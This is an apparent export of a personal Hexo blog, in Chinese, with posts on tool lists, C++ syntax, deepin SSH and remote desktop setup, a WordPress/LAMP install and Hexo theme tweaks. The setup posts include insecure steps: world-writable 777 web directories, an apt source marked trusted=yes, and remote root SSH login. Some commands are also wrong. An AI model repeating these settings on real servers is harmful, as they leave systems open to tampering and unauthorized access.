<h2 id="软件环境"><a href="#软件环境" class="headerlink" title="软件环境"></a>软件环境</h2><div style="position:relative; padding-bottom:75%; width:100%; height:0">
    <iframe src="//player.bilibili.com/player.html?aid=91299923&bvid=BV1F7411u71s&cid=155884314&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position:absolute; height: 100%; width: 100%;"> </iframe>
</div>


<h3 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h3><ul>
<li>[x] XMind ZEN : 思维导图</li>
<li>[x] Typora : markdown</li>
<li>[x] 有道云笔记：同步，私有云图床</li>
<li><p>[x] 电路</p>
</li>
<li><p>[x] AD：主要设计工具</p>
</li>
<li>[ ] Eagle：转换一些开源的eagle格式PCB文档</li>
<li>[x] fritzing：EDA软件，也可以用作矢量风格说明软件</li>
</ul>
<h3 id="机械"><a href="#机械" class="headerlink" title="机械"></a>机械</h3><ul>
<li>[ ] Rhinocores：参数化建模，不适合不规则曲面</li>
<li>[ ] Fusion360：全能</li>
<li>[ ] Cinema4D</li>
<li>[ ] KeyShot：仿真</li>
<li>[ ] inkScape：矢量图轨迹</li>
<li>[ ] ArtCAM：生成雕刻机的刀路文件</li>
</ul>
<h3 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h3><ul>
<li>[x] Visual Studio</li>
<li>[x] Android Studio：手机APP开发</li>
<li>[ ] Jetbrain全家桶</li>
<li>[x] pycharm：python</li>
<li>[x] Rider：C#开发</li>
<li>[x] Clion：C &amp; C++</li>
<li>[ ] Unity：3D仿真</li>
<li>[x] Keil</li>
<li>[ ] CubeMX</li>
<li>[x] Arduino</li>
<li>[ ] KendryteIDE：K210</li>
<li>[ ] Processing：数字多媒体艺术</li>
<li>[x] matlab：建模仿真</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
<li>[x] XShell &amp; Xftp</li>
<li>[x] 串口调试助手 &amp; 网络调试助手</li>
<li>[ ] Cmake</li>
<li>[x] GitGUI</li>
<li>[ ] CoolFormat：代码格式</li>
<li>[ ] IDA：反编译</li>
<li>[ ] wireshark：网络抓包</li>
<li>[ ] SerialChart：串口绘图</li>
<li>[ ] Netron：图形化查看神经网络模型</li>
<li>[ ] beyond Compare：代码比对</li>
</ul>
<h2 id="硬件环境"><a href="#硬件环境" class="headerlink" title="硬件环境"></a>硬件环境</h2><p>总结来自稚晖君的硬件篇视频</p>
<div style="position:relative; padding-bottom:75%; width:100%; height:0">
    <iframe src="//player.bilibili.com/player.html?aid=73533882&bvid=BV19E411a7Sf&cid=125772471&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position:absolute; height: 100%; width: 100%;"> </iframe>
</div>


<p>电脑桌：转角桌（右边电脑区+左边电工区）</p>
<h3 id="电脑区"><a href="#电脑区" class="headerlink" title="电脑区"></a>电脑区</h3><ul>
<li>[] iQniX红轴机械键盘</li>
<li>[] Xbox one</li>
<li>[x] 个人服务器</li>
</ul>
<h3 id="电工区"><a href="#电工区" class="headerlink" title="电工区"></a>电工区</h3><ul>
<li>[] 防割板</li>
<li>[] 热风枪</li>
<li>[] 控温电烙铁</li>
<li>[] 焊接辅助：飞线，锡球，焊锡膏，铁丝球，助焊剂，洗板水……</li>
<li>[] 数控电源</li>
<li>[] 元器件盒： 装主控</li>
<li>[] 电阻电容样品本</li>
<li>[] 示波器：袖珍 20Mhz</li>
</ul>
<h3 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h3><ul>
<li>[x] Android Studio</li>
<li>[x] Linux设备驱动开发详解</li>
<li>[x] 程序员的数学</li>
<li>[ ] 雷军传</li>
<li>[ ] 三体</li>
<li>[x] 算法导论</li>
<li>[ ] Android 设计模式</li>
<li>[ ] 大话计算机</li>
</ul>
<h3 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h3><ul>
<li>[x] 路由器</li>
<li>[ ] 移动硬盘柜 （10T x 2）：深度学习数据集</li>
<li>[ ] 合莱SP-20</li>
<li><p>[ ] 机械</p>
</li>
<li><p>[ ] LCD的光固化3D打印机：体积比较小精度高的模型</p>
</li>
<li>[ ] FDM的3D打印机：居家创客必备</li>
<li>[ ] 小型雕刻机</li>
</ul>
<ul>
<li>[x] 打钩是已经会的和拥有的，未来工作了希望可以也买这么多东西哈哈。</li>
</ul>
]]></content>
      <categories>
        <category>b站</category>
      </categories>
      <tags>
        <tag>b站</tag>
      </tags>
  </entry>
  <entry>
    <title>b站视频分享</title>
    <url>/2017/11/17/b%E7%AB%99%E8%A7%86%E9%A2%91%E5%88%86%E4%BA%AB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><div style="position:relative; padding-bottom:75%; width:100%; height:0">
    <iframe src="//player.bilibili.com/player.html?aid=414001980&bvid=BV1TV411z7aB&cid=218691406&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position:absolute; height: 100%; width: 100%;"> </iframe>
</div><br><span id="more"></span></p>
]]></content>
      <categories>
        <category>分享</category>
      </categories>
      <tags>
        <tag>b站视频</tag>
        <tag>分享</tag>
      </tags>
  </entry>
  <entry>
    <title>c++_常用语法</title>
    <url>/2020/07/31/c/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="C-常用语法"><a href="#C-常用语法" class="headerlink" title="C++常用语法"></a><center>C++常用语法</center></h1><h3 id="2020-08-01"><a href="#2020-08-01" class="headerlink" title="2020_08_01"></a><p align="right">2020_08_01</p></h3><blockquote>
<p>此文主要针对有c语言基础的人。</p>
</blockquote>
<h2 id="1-基本语法"><a href="#1-基本语法" class="headerlink" title="1. 基本语法"></a>1. 基本语法</h2><span id="more"></span>
<ul>
<li><font face="黑体" color=black size=4>对象 - 对象具有状态和行为。例如：一个人的状态 --- 样貌、姓名、出生地、所在地、年龄、身高等。 行为--- 吃饭、工作、学习、运动、游泳等。因而对象是类的实例。</font></li>
<li><font face="黑体" color=black size=4>类 - 类可以定义为描述对象行为/状态的模板/蓝图。
类---一种描述对象行为的框架、一种状态模板、蓝图。</font></li>
<li><font face="黑体" color=black size=4>方法 —- 方法其实可以说就是一种行为，一个类可以包含多个方法。并且可以在方法中写入逻辑操作数据以及执行所有的动作。/font&gt; </li>
<li><font face="黑体" color=black size=4>即时变量 - 每个对象都有其独特的即时变量。对象的状态是由这些即时变量的值创建的。</font>


</li>
</ul>
<h2 id="2-数据类型"><a href="#2-数据类型" class="headerlink" title="2. 数据类型"></a>2. 数据类型</h2><p>&nbsp;&nbsp;基本类型：bool, char, int, float, double, void, wchar_t</p>
<p>&nbsp;&nbsp;修饰：signed, unsigned, short, long</p>
<p>&nbsp;&nbsp;typedef可以位已经有的类型取一个新的名字</p>
<p><code>typedef int feet //feet定义为int的新名子</code></p>
<h4 id="enum枚举类型"><a href="#enum枚举类型" class="headerlink" title="enum枚举类型"></a>enum枚举类型</h4><p>&nbsp;&nbsp;定义枚举常量的集合，一个变量只有几种可能的值。<br><pre class="line-numbers language-none"><code class="language-none">enum 枚举名&#123; 标识符[&#x3D;整型常数], 
            标识符[&#x3D;整型常数], 
            ...
            标识符[&#x3D;整型常数]
           &#125; 枚举变量;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="key-point"><a href="#key-point" class="headerlink" title="key point:"></a>key point:</h3><ul>
<li>如果枚举没有初始化, 即省掉”=整型常数”时, 则从第一个标识符开始.</li>
<li>默认情况下，第一个名称的值为 0，第二个名称的值为 1，第三个名称的值为 2，以此类推。但是，您也可以给名称赋予一个特殊的值，只需要添加一个初始值即可。</li>
<li>因为默认情况下，每个名称都会比它前面一个名称大 1.<pre class="line-numbers language-none"><code class="language-none">enum color &#123; red,green&#x3D;5,blue &#125;;
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="nbsp-nbsp-以下是该用法的实例。此例中，red值为0，green值为5，blue值为6。"><a href="#nbsp-nbsp-以下是该用法的实例。此例中，red值为0，green值为5，blue值为6。" class="headerlink" title="&nbsp;&nbsp;以下是该用法的实例。此例中，red值为0，green值为5，blue值为6。"></a>&nbsp;&nbsp;以下是该用法的实例。此例中，red值为0，green值为5，blue值为6。</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;iostream&gt;
using namespace std;

int main()&#123;
    enum days&#123;one, two, three&#125;day;
    day &#x3D; one;
    switch(day)&#123;
        case one:
            cout &lt;&lt; &quot;one&quot; &lt;&lt; endl;
            break;
        case two:
            cout &lt;&lt; &quot;two&quot; &lt;&lt; endl;
            break;
        default:
            cout &lt;&lt; &quot;three&quot; &lt;&lt; endl;
            break;
    &#125;
    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="3-变量类型"><a href="#3-变量类型" class="headerlink" title="3. 变量类型"></a>3. 变量类型</h2>&nbsp;&nbsp; 大小写敏感，必须以字母或下划线开头。</li>
</ul>
<p>Lvalues &amp; Rvalues</p>
<p>&nbsp;&nbsp; lvalues: 指向内存位置的表达式，左值可以出现在赋值号的左边或右边</p>
<p>&nbsp;&nbsp; rvalues: 指存储在内存中某些地址的数值。右值不能对其进行赋值操作，可以出现在赋值号的右边，但是不能出现在左边。</p>
<h2 id="4-常量"><a href="#4-常量" class="headerlink" title="4. 常量"></a>4. 常量</h2><h3 id="定义方法：-define-和const"><a href="#定义方法：-define-和const" class="headerlink" title="定义方法：#define 和const"></a>定义方法：#define 和const</h3><pre class="line-numbers language-none"><code class="language-none">#define identifier value
const type variable &#x3D; value;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<ol>
<li>修饰符类型</li>
</ol>
<div class="table-container">
<table>
<thead>
<tr>
<th><center> 限定符</center></th>
<th><center>含义  </center></th>
</tr>
</thead>
<tbody>
<tr>
<td><center> const</td>
<td><center> const类型的对象在程序执行期间不能被修改改变。</td>
</tr>
<tr>
<td>volatile</td>
<td>修饰符 volatile 告诉编译器，变量的值可能以程序未明确指定的方式被改变。</td>
</tr>
<tr>
<td>restrict</td>
<td>由 restrict 修饰的指针是唯一一种访问它所指向的对象的方式。只有 C99 增加了新的类型限定符 restrict。</td>
</tr>
</tbody>
</table>
</div>
<hr>
<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>
<h3 id="更多内容请参考C-参考文档"><a href="#更多内容请参考C-参考文档" class="headerlink" title="更多内容请参考C++参考文档"></a><p align="right">更多内容请参考<a href="https://www.runoob.com/cplusplus/cpp-tutorial.html">C++参考文档</a></h3>]]></content>
      <categories>
        <category>程序设计</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>程序设计</tag>
      </tags>
  </entry>
  <entry>
    <title>deepin_ssh_远程控制</title>
    <url>/2021/04/13/deepin-ssh-%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="deepinssh远程控制"><a href="#deepinssh远程控制" class="headerlink" title="deepinssh远程控制"></a>deepin<em>ssh</em>远程控制</h1><h2 id="安装ssh："><a href="#安装ssh：" class="headerlink" title="安装ssh："></a>安装ssh：</h2><pre class="line-numbers language-none"><code class="language-none">apt-get install ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">sudo vi &#x2F;etc&#x2F;ssh&#x2F;sshd_config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>找到下面内容</p>
<p><img src="https://img2020.cnblogs.com/blog/1756476/202004/1756476-20200401231105458-1141980320.png" alt=""></p>
<p> 将红色框中的内容修改为下面的内容：</p>
<p><img src="https://img2020.cnblogs.com/blog/1756476/202004/1756476-20200401231128868-2086048695.png" alt=""></p>
<p>修改成功以后，重启ssh服务：</p>
<p>　　切换至ssh目录下<br>　　　　service ssh restart<br>　　然后我们那就能愉快的使用xshell连远程连接并且用root用户登陆deepin系统了。</p>
<h2 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h2><ol>
<li>在软件商店安装remmina<br>详情请参考<a href="https://jingyan.baidu.com/article/3aed632e2923d8701080911d.html">远程桌面连接-百度经验</a></li>
</ol>
<p>2.安装<br><pre class="line-numbers language-none"><code class="language-none"># sudo apt-get install xrdp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>注意：安装完成后注销当前用户 或运行：</p>
<p>详情请参考<a href="https://blog.csdn.net/yingftf/article/details/104581514">CSDN</a></p>
]]></content>
      <categories>
        <category>deepin</category>
      </categories>
      <tags>
        <tag>deepin</tag>
      </tags>
  </entry>
  <entry>
    <title>deepin_wordpress</title>
    <url>/2021/04/15/deepin-wordpress/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="deepin-wordpress"><a href="#deepin-wordpress" class="headerlink" title="deepin_wordpress"></a>deepin_wordpress</h1><h2 id="安装基础软件"><a href="#安装基础软件" class="headerlink" title="安装基础软件"></a>安装基础软件</h2><h3 id="安装apache2"><a href="#安装apache2" class="headerlink" title="安装apache2"></a>安装apache2</h3><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install apache2 -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h3><p><code>sudo apt-get install php7.0 -y</code></p>
<h3 id="安装PHP的相关组件"><a href="#安装PHP的相关组件" class="headerlink" title="安装PHP的相关组件"></a>安装PHP的相关组件</h3><p><code>sudo pip install libapache2-mod-php7.0</code></p>
<h3 id="安装PHP的相关组件-1"><a href="#安装PHP的相关组件-1" class="headerlink" title="安装PHP的相关组件"></a>安装PHP的相关组件</h3><p>sudo apt-get install libapache2-mod-php7.0</p>
<h3 id="安装mysql的服务，安装过程中需要设置mysql的密码"><a href="#安装mysql的服务，安装过程中需要设置mysql的密码" class="headerlink" title="安装mysql的服务，安装过程中需要设置mysql的密码"></a>安装mysql的服务，安装过程中需要设置mysql的密码</h3><p>sudo apt-get install mysql-server -y</p>
<h3 id="安装php-mysql组件"><a href="#安装php-mysql组件" class="headerlink" title="安装php mysql组件"></a>安装php mysql组件</h3><p>sudo apt-get install php7.0-mysql -y</p>
<h3 id="安装phpmyadmin"><a href="#安装phpmyadmin" class="headerlink" title="安装phpmyadmin"></a>安装phpmyadmin</h3><p>sudo apt-get install phpmyadmin -y</p>
<h3 id="重启mysql和apache"><a href="#重启mysql和apache" class="headerlink" title="重启mysql和apache"></a>重启mysql和apache</h3><p>service apache2 restart<br>service mysql restart</p>
<h3 id="进入mysql"><a href="#进入mysql" class="headerlink" title="进入mysql"></a>进入mysql</h3><p>mysql -u root -p</p>
<p>创建一个叫wordpress（你也可以叫其他名字）的数据库</p>
<p>CREATE DATABASE wordpress;<br>退出mysql</p>
<p>exit;</p>
<h3 id="下载wordpress，这里面的下载会很慢，建议去官网下载"><a href="#下载wordpress，这里面的下载会很慢，建议去官网下载" class="headerlink" title="下载wordpress，这里面的下载会很慢，建议去官网下载"></a>下载wordpress，这里面的下载会很慢，建议去官网下载</h3><p>sudo wget <a href="https://wordpress.org/latest.zip">https://wordpress.org/latest.zip</a></p>
<p>10，解压WordPress</p>
<p>sudo unzip latest.zip</p>
<h3 id="将wordpress的文件移动到-var-www-html-目录-要加个自己的项目目录名，例如wp"><a href="#将wordpress的文件移动到-var-www-html-目录-要加个自己的项目目录名，例如wp" class="headerlink" title="将wordpress的文件移动到/var/www/html/目录(要加个自己的项目目录名，例如wp)"></a>将wordpress的文件移动到/var/www/html/目录(要加个自己的项目目录名，例如wp)</h3><p>sudo mv wordpress/* /var/www/html/wp</p>
<h3 id="修改目录权限，不修改目录权限的话，会无法下载主题插件等"><a href="#修改目录权限，不修改目录权限的话，会无法下载主题插件等" class="headerlink" title="修改目录权限，不修改目录权限的话，会无法下载主题插件等"></a>修改目录权限，不修改目录权限的话，会无法下载主题插件等</h3><p>sudo chmod -R 777 /var/www/html/</p>
<h3 id="重启Apache"><a href="#重启Apache" class="headerlink" title="重启Apache"></a>重启Apache</h3><p>sudo service apache2 restart</p>
<h3 id="接下来在浏览器输入ip-wordpress就可以访问wordpress项目了"><a href="#接下来在浏览器输入ip-wordpress就可以访问wordpress项目了" class="headerlink" title="接下来在浏览器输入ip/wordpress就可以访问wordpress项目了"></a>接下来在浏览器输入ip/wordpress就可以访问wordpress项目了</h3><p>尝试各种修改<br><code>sudo vim sources.list</code><br>注释后增加<br><code>deb [by-hash=force] https://mirrors.tuna.tsinghua.edu.cn/deepin panda main contrib non-free</code><br>sudo apt-get update  和  sudo apt-get upgrade   命令，更新源，需要的时间有点长<br>但是发现无法进行更新，好像deepin不信任该源<br>修改为：<br><code>deb [trusted=yes] https://mirrors.tuna.tsinghua.edu.cn/deepin panda main contrib non-free</code><br>更新一般就崩了</p>
<p>第三次尝试在华为镜像里面的评论找到：</p>
<p>sudo sed -i “s@<a href="https://community-packages.deepin.com/deepin@https://repo.huaweicloud.com/deepin@g">https://community-packages.deepin.com/deepin@https://repo.huaweicloud.com/deepin@g</a>“ /etc/apt/sources.list</p>
<p>sudo apt-get update  和  sudo apt-get upgrade   命令 还是不行，华为也没有mysql-server</p>
<p>参考以上的我把华为修改到清华源试试：<br>sudo sed -i “s@<a href="https://community-packages.deepin.com/deepin@https://mirrors.tuna.tsinghua.edu.cn/deepin@g">https://community-packages.deepin.com/deepin@https://mirrors.tuna.tsinghua.edu.cn/deepin@g</a>“ /etc/apt/sources.list</p>
<p>更新完还是一样的，抑郁…可能是被废弃了，但是又想装。</p>
<p>换阿里源：</p>
<p>sudo sed -i “s@<a href="http://pub.mirrors.aliyun.com/deepin@https://community-packages.deepin.com/deepin@g">http://pub.mirrors.aliyun.com/deepin@https://community-packages.deepin.com/deepin@g</a>“ /etc/apt/sources.list</p>
]]></content>
  </entry>
  <entry>
    <title>hexo插入视频代码块及音频</title>
    <url>/2020/11/24/hexo-b%E7%AB%99%E8%A7%86%E9%A2%91%E5%88%86%E4%BA%AB%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="hexo插件安装插入视频代码块及音频"><a href="#hexo插件安装插入视频代码块及音频" class="headerlink" title="hexo插件安装插入视频代码块及音频"></a><center>hexo插件安装插入视频代码块及音频</center></h1><h2 id="1-hexo插件安装"><a href="#1-hexo插件安装" class="headerlink" title="1.hexo插件安装"></a>1.hexo插件安装</h2><p>使用 Hexo 插件插入音乐/视频<br>两个好用的hexo插件：</p>
<p>**hexo-tag-aplayer：<a href="https://github.com/grzhan/hexo-tag-aplayer">https://github.com/grzhan/hexo-tag-aplayer</a>)</p>
<p>**hexo-tag-dplayer： <a href="https://github.com/NextMoe/hexo-tag-dplayer">https://github.com/NextMoe/hexo-tag-dplayer</a></p>
<h3 id="1-1-播放音乐的aplayer"><a href="#1-1-播放音乐的aplayer" class="headerlink" title="1.1 播放音乐的aplayer"></a>1.1 播放音乐的aplayer</h3><p>  在cmd页面内，使用npm安装：</p>
<blockquote>
<p>npm install hexo-tag-aplayer</p>
<h3 id="1-2-播放视频的dplayer"><a href="#1-2-播放视频的dplayer" class="headerlink" title="1.2 播放视频的dplayer"></a>1.2 播放视频的dplayer</h3><p>  在cmd页面内，使用npm安装：<br>npm install hexo-tag-dplayer</p>
</blockquote>
<h1 id="hexo插入网易云音乐"><a href="#hexo插入网易云音乐" class="headerlink" title="hexo插入网易云音乐"></a><center>hexo插入网易云音乐</center></h1><h2 id="1-提取音乐的代码块"><a href="#1-提取音乐的代码块" class="headerlink" title="1.提取音乐的代码块"></a>1.提取音乐的代码块</h2><ol>
<li>进入<a href="https://music.163.com/">网易云音乐</a>搜索你想要的音乐。（以“下雨天”为例）。</li>
<li>检索后进入<a href="https://music.163.com/#/outchain/2/368764/">下雨天</a>页面，点击分享。</li>
<li>复制该处代码</li>
</ol>
<center>
<img src="https://www.codekp.cn/download/img/bilibili/网易云音乐.JPG" width = "400" height = "302" alt="图片名称" align=center />
</center>

<pre class="line-numbers language-none"><code class="language-none">&lt;iframe frameborder&#x3D;&quot;no&quot; border&#x3D;&quot;0&quot; marginwidth&#x3D;&quot;0&quot; marginheight&#x3D;&quot;0&quot; width&#x3D;530 height&#x3D;86 src&#x3D;&quot;&#x2F;&#x2F;music.163.com&#x2F;outchain&#x2F;player?type&#x3D;2&amp;id&#x3D;368764&amp;auto&#x3D;1&amp;height&#x3D;66&quot;&gt;&lt;&#x2F;iframe&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>直接将其放在你的markdown文件中，即可显示音乐，如下所示：</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=530 height=86 src="//music.163.com/outchain/player?type=2&id=368764&auto=1&height=66"></iframe>




<h1 id="hexo插入bilibili视频代码块"><a href="#hexo插入bilibili视频代码块" class="headerlink" title="hexo插入bilibili视频代码块"></a><center>hexo插入bilibili视频代码块</center></h1><h2 id="1-提取视频的代码块"><a href="#1-提取视频的代码块" class="headerlink" title="1.提取视频的代码块"></a>1.提取视频的代码块</h2><ol>
<li>进入<a href="https://www.bilibili.com/">bilibili</a>搜索你想要的视频。（以“回形针PaperClip你的 App 为什么知道你想买什么？”为例）。</li>
<li>检索后进入<a href="https://www.bilibili.com/video/BV17t411p7gx?from=search&amp;seid=11485789333728231707">回形针PaperClip你的 App 为什么知道你想买什么</a>页面，点击分享。</li>
<li>复制代码块处代码</li>
</ol>
<center>
<img src="https://www.codekp.cn/download/img/bilibili/分享.png" width = "400" height = "302" alt="图片名称" align=center />
</center>

<pre class="line-numbers language-none"><code class="language-none">&lt;iframe src&#x3D;&quot;&#x2F;&#x2F;player.bilibili.com&#x2F;player.html?aid&#x3D;40891962&amp;bvid&#x3D;BV17t411p7gx&amp;cid&#x3D;71826908&amp;page&#x3D;1&quot; scrolling&#x3D;&quot;no&quot; border&#x3D;&quot;0&quot; frameborder&#x3D;&quot;no&quot; framespacing&#x3D;&quot;0&quot; allowfullscreen&#x3D;&quot;true&quot;&gt; &lt;&#x2F;iframe&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>直接将其放在你的markdown文件中，即可显示b站视频，但是会发现视频比较小，如下所示：</p>
<iframe src="//player.bilibili.com/player.html?aid=40891962&bvid=BV17t411p7gx&cid=71826908&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

<h2 id="2-代码块前后修饰"><a href="#2-代码块前后修饰" class="headerlink" title="2.代码块前后修饰"></a>2.代码块前后修饰</h2><p>在改代码的前后基础上加上</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;div style&#x3D;&quot;position:relative; padding-bottom:75%; width:100%; height:0&quot;&gt;

 style&#x3D;&quot;position:absolute; height: 100%; width: 100%;&quot;

&lt;&#x2F;div&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<div style="position:relative; padding-bottom:75%; width:100%; height:0">
<iframe src="//player.bilibili.com/player.html?aid=40891962&bvid=BV17t411p7gx&cid=71826908&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position:absolute; height: 100%; width: 100%;"> </iframe>
</div>


<p>即可将你的视频直接贴在你的文章上。</p>
<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://blog.csdn.net/weixin_41216356/article/details/106911233">如何在Hugo/Hexo博客中插入响应式Bilibili视频代码块</a><br><a href="https://www.jianshu.com/p/26a7fc7cc185">Hexo博客中插入音乐/视频/</a></p>
]]></content>
      <categories>
        <category>辅助技术</category>
      </categories>
      <tags>
        <tag>B站</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo_matery</title>
    <url>/2021/11/12/hexo-matery/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="hexo-matery"><a href="#hexo-matery" class="headerlink" title="hexo_matery"></a>hexo_matery</h1><h2 id="文章前缀"><a href="#文章前缀" class="headerlink" title="文章前缀"></a>文章前缀</h2><div class="table-container">
<table>
<thead>
<tr>
<th>配置选项</th>
<th>默认值</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>title</td>
<td><code>Markdown</code> 的文件标题</td>
<td>文章标题，强烈建议填写此选项</td>
</tr>
<tr>
<td>date</td>
<td>文件创建时的日期时间</td>
<td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td>
</tr>
<tr>
<td>author</td>
<td>根 <code>_config.yml</code> 中的 <code>author</code></td>
<td>文章作者</td>
</tr>
<tr>
<td>img</td>
<td><code>featureImages</code> 中的某个值</td>
<td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <code>http://xxx.com/xxx.jpg</code></td>
</tr>
<tr>
<td>top</td>
<td><code>true</code></td>
<td>推荐文章（文章是否置顶），如果 <code>top</code> 值为 <code>true</code>，则会作为首页推荐文章</td>
</tr>
<tr>
<td>cover</td>
<td><code>false</code></td>
<td><code>v1.0.2</code>版本新增，表示该文章是否需要加入到首页轮播封面中</td>
</tr>
<tr>
<td>coverImg</td>
<td>无</td>
<td><code>v1.0.2</code>版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td>
</tr>
<tr>
<td>password</td>
<td>无</td>
<td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 <code>password</code> 的值，该值必须是用 <code>SHA256</code> 加密后的密码，防止被他人识破。前提是在主题的 <code>config.yml</code> 中激活了 <code>verifyPassword</code> 选项</td>
</tr>
<tr>
<td>toc</td>
<td><code>true</code></td>
<td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 <code>config.yml</code> 中激活了 <code>toc</code> 选项</td>
</tr>
<tr>
<td>mathjax</td>
<td><code>false</code></td>
<td>是否开启数学公式支持 ，本文章是否开启 <code>mathjax</code>，且需要在主题的 <code>_config.yml</code> 文件中也需要开启才行</td>
</tr>
<tr>
<td>summary</td>
<td>无</td>
<td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td>
</tr>
<tr>
<td>categories</td>
<td>无</td>
<td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td>
</tr>
<tr>
<td>tags</td>
<td>无</td>
<td>文章标签，一篇文章可以多个标签</td>
</tr>
<tr>
<td>keywords</td>
<td>文章标题</td>
<td>文章关键字，SEO 时需要</td>
</tr>
<tr>
<td>reprintPolicy</td>
<td>cc_by</td>
<td>文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td>
</tr>
</tbody>
</table>
</div>
<h2 id="subtitle的更改"><a href="#subtitle的更改" class="headerlink" title="subtitle的更改"></a>subtitle的更改</h2><p>这个我找了很久，最后修改其实是在根目录的_config.yml文件修改subtitle的值就可以。</p>
<h2 id="首页轮播"><a href="#首页轮播" class="headerlink" title="首页轮播"></a>首页轮播</h2><p>首先想要看到轮播效果必须先把文章加入轮播里，首页图片和文章图片组成了轮播，如果不把文章加入轮播里就算开启了轮播也没有办法看到轮播效果。</p>
<ul>
<li>cover设置为true即可</li>
<li>然后img设置一下就是其背景</li>
</ul>
<h2 id="首页背景颜色"><a href="#首页背景颜色" class="headerlink" title="首页背景颜色"></a>首页背景颜色</h2><p>我感觉自带的那个背景很丑，直接删掉就好多了，其在matery.css的606-696行，直接删掉吧，感觉加什么颜色都很丑。</p>
<h2 id="导航栏背景颜色"><a href="#导航栏背景颜色" class="headerlink" title="导航栏背景颜色"></a>导航栏背景颜色</h2><p>也是matery.css中找到.bg-cover修改，我用的是<br><pre class="line-numbers language-none"><code class="language-none">.bg-color &#123;
 background-image: linear-gradient(to right, #7371BC 0%, #284D95 100%);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>里面有很多颜色的设置，可以自己选一个，轮播的地方也有，选一个自己喜欢的颜色就好。</p>
<h2 id="安装live2d动画模型"><a href="#安装live2d动画模型" class="headerlink" title="安装live2d动画模型"></a>安装live2d动画模型</h2><ol>
<li>模型预览<a href="https://huaji8.top/post/live2d-plugin-2.0/">live2d</a>,根据样式自己选择一个喜欢的就好。<br>本人选择的是koharu</li>
<li>安装live2d<pre class="line-numbers language-none"><code class="language-none">npm install --save hexo-helper-live2d
npm install live2d-widegt-model-koharu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
<li>根目录的_config.yml添加<pre class="line-numbers language-none"><code class="language-none">
live2d:
  enable: true
